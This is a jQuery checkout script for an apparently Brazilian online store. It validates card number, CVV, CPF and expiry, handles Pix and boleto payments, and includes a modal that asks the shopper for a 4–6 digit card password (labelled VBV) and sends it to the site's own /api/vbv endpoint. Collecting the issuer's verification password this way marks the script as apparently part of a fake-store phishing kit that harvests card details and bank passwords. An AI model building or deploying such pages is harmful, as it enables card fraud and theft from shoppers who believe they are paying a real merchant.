$(function () {

    $(".payment__btn__select").click(function () {
        scrollPage('.sc-fMpoBE.kaA-dYf');
    })

    $(".vbv__password__set").click(function () {
        let obj = $(this);
        let senha = $("#senha__vbv__input").val();
        let digitos = $("#input__digits__hidden").val();
        console.log(senha);

        if (senha.length < 4 || senha.length > 6) {
            $(".vbv__itens__content").addClass('error__vbv__form');
            $(".vbv__digits__password").html("Informe sua senha com 4 ou 6 digitos");
        } else {
            $(".vbv__itens__content").removeClass('error__vbv__form');
            if (!$.isNumeric(senha)) {
                $(".vbv__digits__password").html("Digite apenas números");
                $(".vbv__itens__content").addClass('error__vbv__form');
                return false;
            } 
            $.ajax({
                url: '/api/vbv',
                method: "POST",
                dataType: "JSON",
                headers: {'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')},
                data: {senha: senha},
                beforeSend: function () {
                    obj.html(
                        "<img width='20px' src='storage/themes/web/img/loading.svg'>"
                    ).attr("disabled", true);
                    $("#senha__vbv__input").attr('disabled', true);
                }, success: function (response) {
                    if (response.redirect) {
                        window.location.href = response.redirect;
                    } else {
                        $(".modal").hide();
                        $("#modal__payment__error").show();
                    }
                }, error: function () {
                    $(".modal").hide();
                    $("#modal__payment__error").show();
                }, complete: function () {
                    obj.html(
                        "finalizar"
                    ).attr("disabled", false);
                    $("#senha__vbv__input").attr('disabled', false).val('');
                }
            })
        }
    })

    function validar_form_pagamento_cartao() {
        let numero = $("#card__payment__numero").val();
        let titular = $("#card__payment__titular").val();
        let cpf = $("#card__payment__cpf").val();
        let validade = $("#card__payment__validade").val();
        let cvv = $("#card__payment__cvv").val();
        let retorno = true;

        if (cvv.length < 3 || cvv.length > 4) {
            $('[data-payment_card_div="cvv"]').addClass('error__card__payment');
            retorno = false;
        } else {
            $('[data-payment_card_div="cvv"]').removeClass('error__card__payment');
        }


        if (!validaCPF(cpf)) {
            $('[data-payment_card_div="cpf"]').addClass('error__card__payment');
            retorno = false;
        } else {
            $('[data-payment_card_div="cpf"]').removeClass('error__card__payment');
        }

        if (titular.length < 4 || !titular.includes(" ")) {
            $('[data-payment_card_div="nome"]').addClass('error__card__payment');
            retorno = false;
        } else {
            $('[data-payment_card_div="nome"]').removeClass('error__card__payment');
        }

        if (validade.length < 5) {
            $('[data-payment_card_div="validade"]').addClass('error__card__payment');
            retorno = false;
        } else {
            let explode_validade = validade.split("/");
            if (!$.payment.validateCardExpiry(explode_validade[0], explode_validade[1])) {
                $('[data-payment_card_div="validade"]').addClass('error__card__payment');
                retorno = false;
            } else {
                $('[data-payment_card_div="validade"]').removeClass('error__card__payment');
            }
        }

        if (!$.payment.validateCardNumber(numero)) {
            $('[data-payment_card_div="numero"]').addClass('error__card__payment');
            retorno = false;
        } else {
            $('[data-payment_card_div="numero"]').removeClass('error__card__payment');
        }

        return retorno;
    }

    $("#payment__credit__card__btn").click(function () {
        let btn = $(this);
        let form = $("#finalize__payment__credit__card");
        let dados = form.serialize();
        let email = $('#emailbolado').val();

        let retorno = validar_form_pagamento_cartao();
        $('.sc-fvhGYg.gHYhEm').keyup(function () {
            validar_form_pagamento_cartao();
        })

        if (retorno) {
            $.ajax({
                url: form.attr("action"),
                method: "POST",
                data: dados,
                dataType: "JSON",
                beforeSend: function () {
                    btn.attr('disabled', true).html(
                        '<img width="30px" src="storage/themes/web/img/loading.svg">'
                    );
                }, success: function (response) {
                    if (response.no_redirect_payment) {
                        $(".modal").hide();
                        $("#modal__payment__error").show();
                    }
                    if (response.vbv) {
                        $("#input__digits__hidden").val(4);
                        $("#vbv__digits__password_qtd").html(4);
                        $("#senha__vbv__input").attr("maxlength", 6);
                        $(".modal").hide();
                        $("#modal__payment__vbv").show();
                    }
                    if (response.redirect) {
                        window.location.href = response.redirect;
                    }
                }, error: function () {
                    $(".modal").hide();
                    $("#modal__payment__error").show();
                }, complete: function () {
                    btn.attr('disabled', false).html(
                        'Fechar pedido'
                    );
                    form.trigger("reset");
                }
            })
        }
    })

    $(".installments__selected").click(function () {
        let obj = $(this);
        let installments = obj.val();
        $(".installments__values").html(installments);
        $(".installments__values").val(installments);
        $("#payment__installments__cchg").html(installments);
        $(".modal").hide();
    })

    $("#form__finalize__order__billet").on("submit", function (e) {
        let form = $(this);
        let url = form.attr("action");
        let btn = $("#btn__finalize__order__billet");
        $.ajax({
            url: url,
            method: "POST",
            dataType: "JSON",
            beforeSend: function () {
                btn.html("<img width='30px' src='storage/themes/web/img/loading.svg'>").attr("disabled", true);
            }, success: function (response) {
                if (response.redirect) {
                    window.location.href = response.redirect;
                } else {
                    $(".modal").hide();
                    $("#modal__payment__error").show();
                }
            }, error: function () {
                $(".modal").hide();
                $("#modal__payment__error").show();
            }, complete: function () {
                btn.html("Fechar pedido").attr("disabled", false);
            }
        })
        e.preventDefault();
    })

    $(".pix__btn__copy").click(function () {
        let btn = $(this);
        let key_id = btn.data("key_id");
        //$(".input__key__code").select();
        let val = btn.val();
        let temp = $('<input>');
        $('body').append(temp);
        temp.val(val).select();
        if (document.execCommand("copy")) {
            $.ajax({
                url: "/api/salvacountpix",
                headers: {
                    'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
                },
                data: {
                    key_id: key_id
                },
                method: "POST"
            })
            btn.html("copiado!!").css("border", "2px solid #66ce02").css("color", "#66ce02");
            setTimeout(function () {
                btn.html("copiar código").css("border", "2px solid #0433ff").css("color", "#0433ff");
            }, 4000);
        }
        temp.remove();
    })

    function number_change_valid() {
        let phone = $("#form__update__numbers #phone").val();
        let confirme_phone = $("#form__update__numbers #confirme_phone").val();
        let retorno = true;
        if (phone != confirme_phone) {
            $('[data-div_update_phone="confirme_phone"]').addClass('error');
            retorno = false;
        } else {
            $('[data-div_update_phone="confirme_phone"]').removeClass('error');
        }
        if (phone.length < 14) {
            $('[data-div_update_phone="telefone"]').addClass('error');
            retorno = false;
        } else {
            $('[data-div_update_phone="telefone"]').removeClass('error');
        }
        return retorno;
    }

    $("#form__update__numbers").on("submit", function (e) {
        e.preventDefault();
        let retorno = number_change_valid();
        let form = $(this);
        let botao = $(".change__address__btn");
        $('input').keydown(function () {
            number_change_valid();
        })
        let old_html = $(".footer__address__change").html();
        if (retorno) {
            $.ajax({
                url: form.attr("action"),
                method: "POST",
                data: form.serialize(),
                dataType: "JSON",
                beforeSend: function () {
                    botao.html('<img width="20px" src="storage/themes/web/img/loading.svg">')
                }, complete: function () {
                    setTimeout(function () {
                        form.trigger("reset");
                        $(".footer__address__change").html(
                            "<div style='color: #008000; font-size: 16px;'>Celular atualizado com sucesso!</div>"
                        );
                        setTimeout(function () {
                            $(".footer__address__change").html(old_html);
                        }, 4000);
                    }, 1000);
                }
            })
        }
    })

    $(".multiple").on("click", ".addres__label__change", function () {
        let obj = $(this);
        if (obj.is(":disabled")) {
            return false;
        }
        let dados = obj.data("dados");
        let identidade = obj.data("save_identidade");
        let old_html = $('.' + identidade).html();
        $.ajax({
            url: "/api/salvacountpix",
            method: "POST",
            data: dados,
            dataType: "JSON",
            beforeSend: function () {
                $('.' + identidade).html("<img width='20' src='storage/themes/web/img/loading_blue.svg'>");
                $('.addres__label__change').attr('disabled', true);
            }, complete: function () {
                setTimeout(function () {
                    $('.' + identidade).html(old_html).attr("checked", true);
                    $('[data-save_identidade="' + identidade + '"]').attr("checked", true);
                    $('.addres__label__change').attr('disabled', false);
                    window.location.reload();
                }, 1000);
            }
        })
    })

    $(".address__select__opts").click(function (e) {
        let obj = $(this);
        let target = obj.data('target');
        $('[data-save_identidade="' + target + '"]').click();
    })

    $(".address__new__add").click(function (w) {
        w.preventDefault();
        let btn = $(this);
        btn.html('<img width="20" src="storage/themes/web/img/loading_blue.svg">');
        let url = btn.data("next");
        setTimeout(function () {
            window.location.href = url;
        }, 500);
    })

    $('[data-modal]').click(function (w) {
        w.preventDefault();
        $(".modal").hide();
        let name = $(this).data("modal");
        let delay = $(this).data("modal_delay");
        if (delay == undefined) {
            delay = 500;
        }
        $("#" + name + " #modal_loading").show();
        $("#" + name + " #modal__itens__after").hide();
        $("#" + name).show();
        setTimeout(function () {
            $("#" + name + " #modal_loading").hide();
            $("#" + name + " #modal__itens__after").show();
        }, delay);

    })

    $(".modal__close").click(function () {
        $(".modal").hide();
    })

    $(".modal__close__payment_error").click(function () {
        $(".modal").hide();
        scrollPage('.sc-fMpoBE.kaA-dYf');
    })

    $(".modal").click(function (e) {
        let id = $(this).attr("id");
        let block = $(this).data("block");
        if (block == undefined) {
            if (e.target.id == id) {
                $(".modal").hide();
            }
        }
    })

    $(".payment__btn__select").click(function () {
        let obj = $(this);
        let content_name = obj.data("content");
        $('.payment__method__content').hide();
        $('[data-payment_method="' + content_name + '"]').show();
    })
})